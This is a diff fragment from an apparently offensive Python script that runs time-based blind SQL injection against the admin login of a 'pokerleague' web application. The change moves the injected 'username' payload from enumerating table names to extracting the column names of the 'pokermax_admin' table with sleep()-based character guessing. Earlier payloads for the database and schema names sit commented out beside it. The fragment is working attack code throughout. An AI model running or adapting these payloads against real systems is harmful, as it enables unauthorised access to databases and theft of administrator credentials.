@@ -32,7 +32,8 @@ def sqli():
                 "op": "adminlogin",
                 #"username": f"admin' and if(substr(database(),{position},1)='{i}',sleep(0.9),1)-- -",
                 #"username": f"admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),{position},1)='{i}',sleep(0.9),1)-- -",
-                "username": f"admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema='pokerleague'),{position},1)='{i}',sleep(0.9),1)-- -",
+                #"username": f"admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema='pokerleague'),{position},1)='{i}',sleep(0.9),1)-- -",
+                "username": f"admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema='pokerleague' and table_name='pokermax_admin'),{position},1)='{i}',sleep(0.9),1)-- -",
                 "password": "SAD" 
             }
             l3.status(f"{post_data['username']}")
